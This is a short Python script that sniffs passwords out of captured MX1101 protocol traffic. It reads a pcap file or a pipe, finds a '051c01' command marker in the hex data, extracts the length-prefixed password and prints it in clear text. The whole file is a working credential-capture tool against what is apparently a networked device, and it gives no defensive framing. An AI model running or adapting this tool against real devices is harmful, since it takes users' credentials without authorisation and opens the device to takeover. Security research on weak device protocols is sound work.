#!/usr/bin/python
from scapy.all import * # Lazy import of scapy stuff
import binascii
import os
import argparse
from pcapy import *
from spangslelib import *

def sniffPassword(filename):
    def hdlr (hdr, data):
        crcLen = 3
        searchString = '051c01' # "I'm going to give a password" command
        dataString = binascii.hexlify(data)
        loc = dataString.find(searchString)
        if loc != -1:
            # Grab length of password
            passLen = int(dataString[loc-2:loc],16) - crcLen - 1
            # Grab password itself
            password = dataString[loc+6:loc+6+2*passLen]
            if passLen == 0:
                print 'Password found: <empty>'
            else: print 'Password found: '+ binascii.unhexlify(password)
    try:
        f = open_offline(filename)
        f.loop(0,hdlr)
    except:
        with open(filename) as f:
            for line in f:
                hdlr('',line)

def parseargs():
    parser = argparse.ArgumentParser(
            description='Sniff password out of MX1101 conversation. This could\
                        be from a pcap file or a pipe (mkfifo).')
    parser.add_argument('-f', '--filename', required=True, help='File or pipe\
                        to parse for password')
    return parser.parse_args()

def main():
   
    # Grab target address and other parameters
    args = parseargs()
    filename = args.filename

    # Parse for password
    sniffPassword(filename)

if __name__ == "__main__":
    main()
    sys.exit(1)
